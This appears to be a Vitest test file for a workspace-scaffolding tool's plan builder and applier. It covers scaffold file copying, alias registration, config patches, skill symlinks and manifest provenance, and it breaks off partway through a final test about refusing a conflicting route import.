import {
  lstat,
  mkdir,
  mkdtemp,
  readFile,
  readlink,
  rm,
  stat,
  symlink,
  utimes,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  buildPlan,
  executePlan,
  listModuleFiles,
  selectModuleFiles,
} from "./applier.js";
import type { Plan } from "./applier.js";
import { RefusalError, isRefusal } from "./exit.js";
import { pathExists } from "./fs-utils.js";
import { emptyManifest } from "./manifest.js";
import type { Manifest } from "./manifest.js";
import type { LoadedModule } from "./registry.js";
import type { RegistryItem, SaasaloyConfig } from "./schema.js";
import { validateManifest, validateRegistryItem } from "./schema.js";

// The scaffold applier: a capability's scaffolds[] must materialize a whole workspace —
// files copied to workspace-root-relative targets, the declared alias registered into
// saasaloy.json, everything tracked in the manifest — reusing the files[] machinery.

let root: string;
let moduleRoot: string;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "saasaloy-scaffold-root-"));
  moduleRoot = await mkdtemp(join(tmpdir(), "saasaloy-scaffold-mod-"));
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
  await rm(moduleRoot, { recursive: true, force: true });
});

// Lay a module folder on disk (source files under its dir) and return its LoadedModule.
// `files` is optional: a module that only carries patches ships no source files of its own.
async function writeModule(
  name: string,
  item: Omit<RegistryItem, "name">,
  files: Record<string, string> = {}
): Promise<LoadedModule> {
  const dir = join(moduleRoot, name);
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, content, "utf-8");
  }
  return { dir, item: { name, ...item } };
}

function emptyConfig(): SaasaloyConfig {
  return { aliases: {}, installed: [] };
}

interface PlanInputs {
  install: string[];
  modules: LoadedModule[];
  config?: SaasaloyConfig;
  manifest?: Manifest;
}

function plan({
  install,
  modules,
  config,
  manifest,
}: PlanInputs): Promise<Plan> {
  return buildPlan({
    root,
    install,
    alreadyInstalled: [],
    modules: new Map(modules.map((m) => [m.item.name, m])),
    config: config ?? emptyConfig(),
    manifest: manifest ?? emptyManifest(),
  });
}

// A capability whose whole workspace ships in one scaffold entry — the `api` shape.
async function apiCapability(): Promise<LoadedModule> {
  return writeModule(
    "api",
    {
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          aliases: { "@api": "apps/api/src" },
          files: [
            { path: "files/package.json", target: "package.json" },
            { path: "files/src/index.ts", target: "src/index.ts" },
          ],
        },
      ],
    },
    {
      "files/package.json": '{ "name": "@app/api" }\n',
      "files/src/index.ts": "export default {};\n",
    }
  );
}

describe("buildPlan — scaffolds", () => {
  it("plans scaffold files at workspace-root-relative targets", async () => {
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
    });
    expect(p.files.map((f) => f.target).toSorted()).toStrictEqual([
      "apps/api/package.json",
      "apps/api/src/index.ts",
    ]);
    expect(p.files.every((f) => f.action === "create")).toBeTruthy();
    expect(p.files.every((f) => f.module === "api")).toBeTruthy();
  });

  it("collects the aliases a scaffold registers", async () => {
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
    });
    expect(p.aliases).toStrictEqual({ "@api": "apps/api/src" });
    expect(p.aliasConflicts).toStrictEqual([]);
  });

  it("no longer defers scaffolds (the field is gone)", async () => {
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
    });
    expect(p).not.toHaveProperty("deferredScaffolds");
  });

  it("resolves a same-run feature's files against the capability's new alias", async () => {
    const feature = await writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        dependsOn: ["api"],
        files: [
          {
            path: "files/routes/waitlist.ts",
            target: "@api/routes/waitlist.ts",
          },
        ],
      },
      { "files/routes/waitlist.ts": "export default {};\n" }
    );
    // Topo order lands the capability first; the feature's @api target must resolve
    // even though @api isn't in the on-disk config yet.
    const p = await plan({
      install: ["api", "waitlist"],
      modules: [await apiCapability(), feature],
    });
    expect(p.files.map((f) => f.target)).toContain(
      "apps/api/src/routes/waitlist.ts"
    );
  });

  it("flags an alias that would redefine an existing one to a different path", async () => {
    const config: SaasaloyConfig = {
      aliases: { "@api": "packages/api/src" },
      installed: [],
    };
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
    });
    expect(p.aliasConflicts).toHaveLength(1);
    expect(p.aliasConflicts[0]).toContain("@api");
  });

  it("holds back a pre-existing untracked scaffold file as a conflict", async () => {
    // A file we never wrote (not in the manifest) sits at the scaffold target.
    const existing = join(root, "apps", "api", "package.json");
    await mkdir(dirname(existing), { recursive: true });
    await writeFile(existing, '{ "name": "hand-written" }\n', "utf-8");

    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
    });
    const pkg = p.files.find((f) => f.target === "apps/api/package.json");
    expect(pkg?.action).toBe("conflict");
  });
});

describe("executePlan — removal warnings", () => {
  it("persists descriptor warnings by module name", async () => {
    const teams = await writeModule("teams", {
      type: "saasaloy:feature",
      removeWarnings: ["The organization tables survive removal."],
    });
    const manifest = emptyManifest();
    const config = emptyConfig();
    const p = await plan({ install: ["teams"], modules: [teams] });

    await executePlan(p, root, config, manifest);

    expect(manifest.removeWarnings).toStrictEqual({
      teams: ["The organization tables survive removal."],
    });
  });

  it("clears stale warnings when a descriptor no longer supplies them", async () => {
    const teams = await writeModule("teams", {
      type: "saasaloy:feature",
    });
    const manifest = emptyManifest();
    manifest.removeWarnings.teams = ["Old warning"];
    const config = emptyConfig();
    const p = await plan({ install: ["teams"], modules: [teams] });

    await executePlan(p, root, config, manifest);

    expect(manifest.removeWarnings.teams).toBeUndefined();
  });
});

describe("executePlan — scaffolds", () => {
  it("writes the workspace, registers the alias, records the manifest", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
      manifest,
    });

    const result = await executePlan(p, root, config, manifest);

    // Files landed on disk under the workspace root.
    await expect(
      pathExists(join(root, "apps", "api", "package.json"))
    ).resolves.toBeTruthy();
    await expect(
      readFile(join(root, "apps", "api", "src", "index.ts"), "utf-8")
    ).resolves.toBe("export default {};\n");
    // Alias registered + module marked installed.
    expect(config.aliases["@api"]).toBe("apps/api/src");
    expect(config.installed).toContain("api");
    // Every scaffold file tracked so `remove` can undo it.
    expect(manifest.managed["apps/api/package.json"]?.module).toBe("api");
    expect(manifest.managed["apps/api/src/index.ts"]?.module).toBe("api");
    expect(result.written).toHaveLength(2);
    expect(result.heldBack).toHaveLength(0);
  });

  it("does not clobber a held-back conflict", async () => {
    const original = '{ "name": "hand-written" }\n';
    const existing = join(root, "apps", "api", "package.json");
    await mkdir(dirname(existing), { recursive: true });
    await writeFile(existing, original, "utf-8");

    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);

    await expect(readFile(existing, "utf-8")).resolves.toBe(original);
    expect(result.heldBack.map((f) => f.target)).toContain(
      "apps/api/package.json"
    );
    // The conflicting file is not recorded as managed.
    expect(manifest.managed["apps/api/package.json"]).toBeUndefined();
  });
});

// `update` has to map a managed file back to the module file it came from to fetch
// that file at two SHAs. The hash alone can't do it, so every entry records the
// module-relative source path it was copied from (issue #48, decision 2).
describe("manifest `from` — module-relative provenance", () => {
  it("records `from` for a scaffold file", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
      manifest,
    });
    await executePlan(p, root, config, manifest);

    expect(manifest.managed["apps/api/src/index.ts"]).toMatchObject({
      module: "api",
      from: "files/src/index.ts",
    });
  });

  it("records `from` for a files[] entry resolved through an alias", async () => {
    const config: SaasaloyConfig = {
      aliases: { "@api": "apps/api/src" },
      installed: [],
    };
    const manifest = emptyManifest();
    const mod = await writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        files: [
          {
            path: "files/routes/waitlist.ts",
            target: "@api/routes/waitlist.ts",
          },
        ],
      },
      { "files/routes/waitlist.ts": "export const route = 1;\n" }
    );
    const p = await plan({
      install: ["waitlist"],
      modules: [mod],
      config,
      manifest,
    });
    await executePlan(p, root, config, manifest);

    expect(manifest.managed["apps/api/src/routes/waitlist.ts"]).toMatchObject({
      from: "files/routes/waitlist.ts",
    });
  });

  it("records `from` for a copied skill file", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await skillModule()],
      config,
      manifest,
    });
    await executePlan(p, root, config, manifest);

    expect(
      manifest.managed[".agents/skills/saasaloy-api/SKILL.md"]
    ).toMatchObject({
      from: "skills/saasaloy-api/SKILL.md",
    });
  });

  it("passes schema validation with `from` present", async () => {
    const result = await validateManifest({
      managed: {
        "apps/api/src/index.ts": {
          module: "api",
          hash: "a".repeat(64),
          from: "files/src/index.ts",
        },
      },
    });
    expect(result.valid).toBeTruthy();
  });

  it("still validates a manifest written before `from` existed", async () => {
    const result = await validateManifest({
      managed: {
        "apps/api/src/index.ts": { module: "api", hash: "a".repeat(64) },
      },
    });
    expect(result.valid).toBeTruthy();
  });
});

// A module shipping a Claude skill folder via agent.skills — the `api` runbook shape.
async function skillModule(name = "api"): Promise<LoadedModule> {
  const folder = `saasaloy-${name}`;
  return writeModule(
    name,
    {
      type: "saasaloy:capability",
      agent: { skills: [`skills/${folder}`] },
    },
    {
      [`skills/${folder}/SKILL.md`]: "# runbook\n",
      [`skills/${folder}/reference.md`]: "notes\n",
    }
  );
}

describe("buildPlan — skill links", () => {
  it("plans skill files under .agents/skills, not .claude/skills", async () => {
    const p = await plan({ install: ["api"], modules: [await skillModule()] });
    const skillTargets = p.files
      .filter((f) => f.isSkill)
      .map((f) => f.target)
      .toSorted();
    expect(skillTargets).toStrictEqual([
      ".agents/skills/saasaloy-api/SKILL.md",
      ".agents/skills/saasaloy-api/reference.md",
    ]);
    expect(
      p.files.some((f) => f.target.startsWith(".claude/skills"))
    ).toBeFalsy();
  });

  it("plans a .claude/skills → .agents/skills symlink per skill folder", async () => {
    const p = await plan({ install: ["api"], modules: [await skillModule()] });
    expect(p.links).toHaveLength(1);
    expect(p.links[0]).toMatchObject({
      module: "api",
      path: ".claude/skills/saasaloy-api",
      target: ".agents/skills/saasaloy-api",
      action: "create",
    });
  });
});

describe("executePlan — skill links", () => {
  it("writes real skill files and a symlink pointing at them, recorded in manifest.links", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await skillModule()],
      config,
      manifest,
    });

    const result = await executePlan(p, root, config, manifest);

    // Real committed files under .agents/skills.
    await expect(
      readFile(join(root, ".agents/skills/saasaloy-api/SKILL.md"), "utf-8")
    ).resolves.toBe("# runbook\n");
    // A symlink at .claude/skills/saasaloy-api resolving to the .agents copy.
    const linkAbs = join(root, ".claude/skills/saasaloy-api");
    expect((await lstat(linkAbs)).isSymbolicLink()).toBeTruthy();
    const dest = await readlink(linkAbs);
    expect(resolve(dirname(linkAbs), dest)).toBe(
      resolve(join(root, ".agents/skills/saasaloy-api"))
    );
    // Recorded source → link for a clean remove.
    expect(manifest.links[".agents/skills/saasaloy-api"]).toBe(
      ".claude/skills/saasaloy-api"
    );
    expect(result.links).toHaveLength(1);
    expect(result.linkConflicts).toHaveLength(0);
  });

  it("is idempotent — a re-add sees the existing link and re-creates nothing", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mod = await skillModule();
    await executePlan(
      await plan({ install: ["api"], modules: [mod], config, manifest }),
      root,
      config,
      manifest
    );

    // Second pass over the same tree: the link already resolves correctly.
    const second = await plan({
      install: ["api"],
      modules: [mod],
      config,
      manifest,
    });
    expect(second.links[0]?.action).toBe("exists");
    const result = await executePlan(second, root, config, manifest);
    expect(result.linkConflicts).toHaveLength(0);
    expect(
      (await lstat(join(root, ".claude/skills/saasaloy-api"))).isSymbolicLink()
    ).toBeTruthy();
  });

  it("holds back a .claude/skills path already occupied by something else", async () => {
    // A real directory (not our symlink) sits where the link would go.
    const occupied = join(root, ".claude/skills/saasaloy-api");
    await mkdir(occupied, { recursive: true });
    await writeFile(join(occupied, "SKILL.md"), "hand-written\n", "utf-8");

    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await skillModule()],
      config,
      manifest,
    });
    expect(p.links[0]?.action).toBe("conflict");

    const result = await executePlan(p, root, config, manifest);
    expect(result.linkConflicts.map((l) => l.path)).toContain(
      ".claude/skills/saasaloy-api"
    );
    // The hand-written dir is left intact and nothing is recorded for it.
    expect((await lstat(occupied)).isDirectory()).toBeTruthy();
    expect(manifest.links[".agents/skills/saasaloy-api"]).toBeUndefined();
  });
});

describe("registry-item schema — tightened scaffolds", () => {
  it("accepts the committed { workspace, aliases, files } shape", async () => {
    const result = await validateRegistryItem({
      name: "api",
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          aliases: { "@api": "apps/api/src" },
          files: [{ path: "files/src/index.ts", target: "src/index.ts" }],
        },
      ],
    });
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });

  it("rejects an @alias-prefixed scaffold target (must be workspace-root-relative)", async () => {
    const result = await validateRegistryItem({
      name: "api",
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          files: [{ path: "files/src/index.ts", target: "@api/index.ts" }],
        },
      ],
    });
    expect(result.valid).toBeFalsy();
  });
});

const scriptItem = (patch: Record<string, unknown>) => ({
  name: "database",
  type: "saasaloy:feature" as const,
  patches: [patch],
});

describe("registry-item schema — package-json-script payload", () => {
  it("accepts a package-json-script patch carrying both name and value", async () => {
    const result = await validateRegistryItem(
      scriptItem({
        file: "apps/api/package.json",
        kind: "package-json-script",
        name: "db:generate",
        value: "drizzle-kit generate",
      })
    );
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });

  it("rejects a package-json-script patch missing the script name", async () => {
    const result = await validateRegistryItem(
      scriptItem({
        file: "apps/api/package.json",
        kind: "package-json-script",
        value: "drizzle-kit generate",
      })
    );
    expect(result.valid).toBeFalsy();
    expect(result.errors.join("\n")).toContain(
      'missing required property "name"'
    );
  });

  it("rejects a package-json-script patch missing the script value", async () => {
    const result = await validateRegistryItem(
      scriptItem({
        file: "apps/api/package.json",
        kind: "package-json-script",
        name: "db:generate",
      })
    );
    expect(result.valid).toBeFalsy();
    expect(result.errors.join("\n")).toContain(
      'missing required property "value"'
    );
  });

  it("rejects an empty script name or value", async () => {
    const blankName = await validateRegistryItem(
      scriptItem({
        file: "apps/api/package.json",
        kind: "package-json-script",
        name: "",
        value: "x",
      })
    );
    expect(blankName.valid).toBeFalsy();

    const blankValue = await validateRegistryItem(
      scriptItem({
        file: "apps/api/package.json",
        kind: "package-json-script",
        name: "x",
        value: "",
      })
    );
    expect(blankValue.valid).toBeFalsy();
  });

  it("leaves the pre-existing patch kinds' payloads unvalidated", async () => {
    // Phase 1 tightens only the new kind; the three existing kinds keep their
    // permissive payloads so descriptors already on disk still validate.
    const result = await validateRegistryItem(
      scriptItem({ file: "apps/api/wrangler.jsonc", kind: "wrangler-binding" })
    );
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });
});

const routeItem = (patch: Record<string, unknown>) => ({
  name: "waitlist",
  type: "saasaloy:feature" as const,
  patches: [patch],
});

describe("registry-item schema — chained-route payload", () => {
  const full = {
    file: "apps/api/src/index.ts",
    kind: "chained-route",
    exportName: "default",
    path: "/waitlist",
    call: "waitlist",
    import: { name: "waitlist", from: "./routes/waitlist.js" },
  };

  it("accepts a chained-route patch carrying every payload field", async () => {
    const result = await validateRegistryItem(routeItem(full));
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });

  it.each(["exportName", "path", "call", "import"])(
    "rejects a chained-route patch missing %s",
    async (field) => {
      const { [field]: _dropped, ...rest } = full as Record<string, unknown>;
      const result = await validateRegistryItem(routeItem(rest));
      expect(result.valid).toBeFalsy();
      expect(result.errors.join("\n")).toContain(
        `missing required property "${field}"`
      );
    }
  );

  it("rejects an import missing its module specifier", async () => {
    const result = await validateRegistryItem(
      routeItem({ ...full, import: { name: "waitlist" } })
    );
    expect(result.valid).toBeFalsy();
    expect(result.errors.join("\n")).toContain(
      'missing required property "from"'
    );
  });

  it("rejects an empty path", async () => {
    const result = await validateRegistryItem(routeItem({ ...full, path: "" }));
    expect(result.valid).toBeFalsy();
  });
});

describe("buildPlan — dep buckets", () => {
  it("aggregates dependencies and devDependencies into parallel plan arrays", async () => {
    const mod = await writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        dependencies: ["zod@4.0.5"],
        devDependencies: ["@types/node@26.1.1"],
      },
      {}
    );
    const p = await plan({ install: ["waitlist"], modules: [mod] });
    expect(p.dependencies).toStrictEqual(["zod@4.0.5"]);
    expect(p.devDependencies).toStrictEqual(["@types/node@26.1.1"]);
  });
});

// --- Config patches: applied (not deferred), array-shaped, idempotent (ADR 0019). ---

// api variant that ships a real wrangler.jsonc scaffold file for `database` to patch.
async function apiWithWrangler(): Promise<LoadedModule> {
  return writeModule(
    "api",
    {
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          aliases: { "@api": "apps/api/src" },
          files: [{ path: "files/wrangler.jsonc", target: "wrangler.jsonc" }],
        },
      ],
    },
    { "files/wrangler.jsonc": '{\n  "name": "api"\n}\n' }
  );
}

// A `database`-shaped capability: it patches the D1 binding into api's wrangler.jsonc.
async function dbCapability(): Promise<LoadedModule> {
  return writeModule(
    "database",
    {
      type: "saasaloy:capability",
      dependsOn: ["api"],
      patches: [
        {
          file: "apps/api/wrangler.jsonc",
          kind: "wrangler-binding",
          bindingType: "d1_databases",
          entry: {
            binding: "DB",
            database_name: "app-db",
            database_id: "local",
            migrations_dir: "../../packages/db/migrations",
          },
        },
      ],
      scaffolds: [
        {
          workspace: "packages/db",
          aliases: { "@db": "packages/db/src" },
          files: [{ path: "files/client.ts", target: "src/client.ts" }],
        },
      ],
    },
    { "files/client.ts": "export const x = 1;\n" }
  );
}

describe("buildPlan — config patches", () => {
  it("plans a patch against a same-run scaffolded file (not yet on disk)", async () => {
    const p = await plan({
      install: ["api", "database"],
      modules: [await apiWithWrangler(), await dbCapability()],
    });
    expect(p.patches).toHaveLength(1);
    const patch = p.patches[0];
    expect(patch).toMatchObject({
      module: "database",
      file: "apps/api/wrangler.jsonc",
      action: "apply",
    });
    expect(patch?.diff).toContain("d1_databases");
  });

  it("marks a patch unchanged when the binding is already present (idempotent)", async () => {
    const existing = join(root, "apps", "api", "wrangler.jsonc");
    await mkdir(dirname(existing), { recursive: true });
    await writeFile(
      existing,
      '{\n  "d1_databases": [{ "binding": "DB" }]\n}\n',
      "utf-8"
    );
    const p = await plan({
      install: ["database"],
      modules: [await dbCapability()],
    });
    expect(p.patches[0]?.action).toBe("unchanged");
  });

  it("marks a patch missing when the target is neither planned nor on disk", async () => {
    const p = await plan({
      install: ["database"],
      modules: [await dbCapability()],
    });
    expect(p.patches[0]?.action).toBe("missing");
  });
});

describe("executePlan — config patches", () => {
  it("writes the binding into the scaffolded file and does not track it as managed", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "database"],
      modules: [await apiWithWrangler(), await dbCapability()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);

    const wrangler = await readFile(
      join(root, "apps", "api", "wrangler.jsonc"),
      "utf-8"
    );
    expect(wrangler).toContain("d1_databases");
    expect(wrangler).toContain('"binding": "DB"');
    // The patched file stays owned by whoever scaffolded it — the patch doesn't retrack it (ADR 0019).
    expect(manifest.managed["apps/api/wrangler.jsonc"]?.module).toBe("api");
    expect(result.patched.map((x) => x.file)).toContain(
      "apps/api/wrangler.jsonc"
    );
    expect(result.patchConflicts).toHaveLength(0);
  });

  it("is idempotent — a second apply changes nothing", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiWithWrangler(), await dbCapability()];
    await executePlan(
      await plan({
        install: ["api", "database"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );
    const before = await readFile(
      join(root, "apps", "api", "wrangler.jsonc"),
      "utf-8"
    );

    const second = await plan({
      install: ["api", "database"],
      modules: mods,
      config,
      manifest,
    });
    const result = await executePlan(second, root, config, manifest);
    expect(result.patched).toHaveLength(0);
    await expect(
      readFile(join(root, "apps", "api", "wrangler.jsonc"), "utf-8")
    ).resolves.toBe(before);
  });

  it("reports a conflict when the patch target is missing", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["database"],
      modules: [await dbCapability()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);
    expect(result.patchConflicts.map((x) => x.file)).toContain(
      "apps/api/wrangler.jsonc"
    );
    expect(result.patched).toHaveLength(0);
  });

  it("records the applied patch in the manifest so `remove` can warn about it", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "database"],
      modules: [await apiWithWrangler(), await dbCapability()],
      config,
      manifest,
    });
    await executePlan(p, root, config, manifest);

    expect(manifest.patches).toHaveLength(1);
    expect(manifest.patches[0]).toMatchObject({
      module: "database",
      file: "apps/api/wrangler.jsonc",
    });
    expect(manifest.patches[0]?.patch.kind).toBe("wrangler-binding");
  });

  it("dedupes an identical patch entry on re-apply (structural equality)", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiWithWrangler(), await dbCapability()];
    await executePlan(
      await plan({
        install: ["api", "database"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );
    expect(manifest.patches).toHaveLength(1);

    // Hand-revert the patched file so `--force` sees the same op apply again.
    await writeFile(
      join(root, "apps", "api", "wrangler.jsonc"),
      '{\n  "name": "api"\n}\n',
      "utf-8"
    );

    const second = await plan({
      install: ["api", "database"],
      modules: mods,
      config,
      manifest,
    });
    const result = await executePlan(second, root, config, manifest);
    expect(result.patched).toHaveLength(1);
    // Same module/file/patch as before — not duplicated.
    expect(manifest.patches).toHaveLength(1);
  });
});

// #83 Phase 4. The two new patch kinds have their own codemod unit tests; what those
// can't show is the case the kinds exist for — a module patching a workspace ANOTHER
// module scaffolds in the same run. These drive add and re-add through the real
// buildPlan/executePlan pair, so the `unchanged` action and the never-clobber rule are
// asserted on disk rather than on a string. The remove leg lives in remover.test.ts.

// An `api`-shaped capability scaffolding both files the new kinds target: the
// workspace's package.json and its Hono entry chain.
async function apiWorkspace(): Promise<LoadedModule> {
  return writeModule(
    "api",
    {
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          aliases: { "@api": "apps/api/src" },
          files: [
            { path: "files/package.json", target: "package.json" },
            { path: "files/src/index.ts", target: "src/index.ts" },
          ],
        },
      ],
    },
    {
      "files/package.json":
        '{\n  "name": "@app/api",\n  "scripts": {\n    "dev": "wrangler dev"\n  }\n}\n',
      "files/src/index.ts": `import { Hono } from "hono";

const app = new Hono();

export type AppType = typeof app;
export default app;
`,
    }
  );
}

// A `database`-shaped capability adding a command to the app it wires itself into.
async function dbWithScript(): Promise<LoadedModule> {
  return writeModule("database", {
    type: "saasaloy:capability",
    dependsOn: ["api"],
    patches: [
      {
        file: "apps/api/package.json",
        kind: "package-json-script",
        name: "db:generate",
        value: "drizzle-kit generate",
      },
    ],
  });
}

// A `waitlist`-shaped feature registering its sub-router on api's exported chain.
async function waitlistWithRoute(): Promise<LoadedModule> {
  return writeModule("waitlist", {
    type: "saasaloy:feature",
    dependsOn: ["api"],
    patches: [
      {
        file: "apps/api/src/index.ts",
        kind: "chained-route",
        exportName: "default",
        path: "/waitlist",
        call: "waitlist",
        import: { name: "waitlist", from: "./routes/waitlist.js" },
      },
    ],
  });
}

const PKG_TARGET = "apps/api/package.json";
const ENTRY_TARGET = "apps/api/src/index.ts";

describe("applier — package-json-script end to end", () => {
  it("plans the script against a package.json the same run scaffolds", async () => {
    const p = await plan({
      install: ["api", "database"],
      modules: [await apiWorkspace(), await dbWithScript()],
    });
    expect(p.patches).toHaveLength(1);
    expect(p.patches[0]).toMatchObject({
      module: "database",
      file: PKG_TARGET,
      action: "apply",
    });
    expect(p.patches[0]?.diff).toContain("db:generate");
  });

  it("writes the script beside the scaffolded one and records the patch", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "database"],
      modules: [await apiWorkspace(), await dbWithScript()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);

    const pkg = JSON.parse(
      await readFile(join(root, "apps", "api", "package.json"), "utf-8")
    );
    expect(pkg.scripts).toStrictEqual({
      dev: "wrangler dev",
      "db:generate": "drizzle-kit generate",
    });
    expect(result.patched.map((x) => x.file)).toContain(PKG_TARGET);
    // The patched file stays owned by whoever scaffolded it (ADR 0019).
    expect(manifest.managed[PKG_TARGET]?.module).toBe("api");
    expect(manifest.patches[0]).toMatchObject({
      module: "database",
      file: PKG_TARGET,
    });
    expect(manifest.patches[0]?.patch.kind).toBe("package-json-script");
  });

  it("plans a re-add as unchanged and writes nothing the second time", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiWorkspace(), await dbWithScript()];
    await executePlan(
      await plan({
        install: ["api", "database"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );
    const before = await readFile(
      join(root, "apps", "api", "package.json"),
      "utf-8"
    );

    const second = await plan({
      install: ["api", "database"],
      modules: mods,
      config,
      manifest,
    });
    expect(second.patches[0]?.action).toBe("unchanged");
    expect(second.patches[0]?.diff).toBe("");

    const result = await executePlan(second, root, config, manifest);
    expect(result.patched).toHaveLength(0);
    await expect(
      readFile(join(root, "apps", "api", "package.json"), "utf-8")
    ).resolves.toBe(before);
    expect(manifest.patches).toHaveLength(1);
  });

  it("leaves a command the user edited alone", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiWorkspace(), await dbWithScript()];
    await executePlan(
      await plan({
        install: ["api", "database"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );

    const abs = join(root, "apps", "api", "package.json");
    const edited = (await readFile(abs, "utf-8")).replace(
      "drizzle-kit generate",
      "drizzle-kit generate --custom"
    );
    await writeFile(abs, edited, "utf-8");

    const second = await plan({
      install: ["api", "database"],
      modules: mods,
      config,
      manifest,
    });
    expect(second.patches[0]?.action).toBe("unchanged");
    await executePlan(second, root, config, manifest);
    await expect(readFile(abs, "utf-8")).resolves.toBe(edited);
  });
});

describe("applier — chained-route end to end", () => {
  it("plans the route link against an entry file the same run scaffolds", async () => {
    const p = await plan({
      install: ["api", "waitlist"],
      modules: [await apiWorkspace(), await waitlistWithRoute()],
    });
    expect(p.patches).toHaveLength(1);
    expect(p.patches[0]).toMatchObject({
      module: "waitlist",
      file: ENTRY_TARGET,
      action: "apply",
    });
    expect(p.patches[0]?.diff).toContain('.route("/waitlist", waitlist)');
  });

  it("writes the link and its import, and adds no sentinel comment (ADR 0006)", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "waitlist"],
      modules: [await apiWorkspace(), await waitlistWithRoute()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);

    const entry = await readFile(
      join(root, "apps", "api", "src", "index.ts"),
      "utf-8"
    );
    // magicast writes its own import at the top of the file, without inner spacing —
    // the same shape the plugin-array codemod has always emitted.
    expect(entry).toMatch(
      /import \{\s*waitlist\s*\} from "\.\/routes\/waitlist\.js";/
    );
    expect(entry).toContain('.route("/waitlist", waitlist)');
    // The chain locates itself; nothing marks the insertion point.
    expect(entry.toLowerCase()).not.toContain("saasaloy");
    // The type export the RPC client derives from survives the edit.
    expect(entry).toContain("export type AppType = typeof app;");
    expect(result.patched.map((x) => x.file)).toContain(ENTRY_TARGET);
    expect(manifest.patches[0]?.patch.kind).toBe("chained-route");
  });

  it("plans a re-add as unchanged and writes nothing the second time", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiWorkspace(), await waitlistWithRoute()];
    await executePlan(
      await plan({
        install: ["api", "waitlist"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );
    const before = await readFile(
      join(root, "apps", "api", "src", "index.ts"),
      "utf-8"
    );

    const second = await plan({
      install: ["api", "waitlist"],
      modules: mods,
      config,
      manifest,
    });
    expect(second.patches[0]?.action).toBe("unchanged");
    expect(second.patches[0]?.diff).toBe("");

    const result = await executePlan(second, root, config, manifest);
    expect(result.patched).toHaveLength(0);
    await expect(
      readFile(join(root, "apps", "api", "src", "index.ts"), "utf-8")
    ).resolves.toBe(before);
    expect(manifest.patches).toHaveLength(1);
  });

  it("refuses the route when the entry file binds the name to another module", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const abs = join(root, "apps", "api", "src", "index.ts");

    // Scaffold the api workspace, then plant the conflicting import by hand — the shape a
    // real project arrives in, where `waitlist` already means something else here.
    await executePlan(
      await plan({
        install: ["api"],
        modules: [await apiWorkspace()],
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );
    const conflicting = (await readFile(abs, "utf-8")).replace(
      'import { Hono } from "hono";',
      'import { Hono } from "hono";\nimport { waitlist } from "./legacy.js";'
    );
    await writeFile(abs, conflicting, "utf-8");

    const second = await plan({
      install: ["api", "waitlist"],
      modules: [await apiWorkspace(), await waitlistWithRoute()],
      config,
      manifest,
    });
    const result = await executePlan(second, root, config, manifest);

    // Wiring `.route("/waitlist", waitlist)` here would bind the legacy module's export.
    await expect(readFile(abs, "utf-8")).resolves.toBe(conflicting);
